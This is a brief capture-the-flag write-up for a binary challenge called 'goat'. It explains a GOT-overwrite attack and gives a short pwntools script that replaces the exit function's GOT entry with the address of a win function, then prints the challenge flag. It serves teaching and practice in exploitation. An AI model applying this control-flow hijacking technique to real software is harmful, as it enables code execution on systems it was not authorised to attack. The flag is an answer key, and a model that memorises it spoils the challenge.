# 🔑 Write-Up

Since we can see the code, we notice that there is a `win` function that prints the flag. What we can do is overwrite some entry in the GOT to gain control of the program's control flow.

The purpose of this script is to overwrite the exit function's GOT entry with the address of the win function, effectively redirecting the program's execution flow to the win function when the exit function is called.

```python
from pwn import *

context.binary = "./goat"
p = process()

p.sendline(hex(context.binary.got["exit"]).encode("ascii"))
p.sendline(hex(context.binary.functions["win"].address).encode("ascii"))
p.interactive()
```

### 🚩 Flag

```plain
spritz{GOT_not_Goat!}
```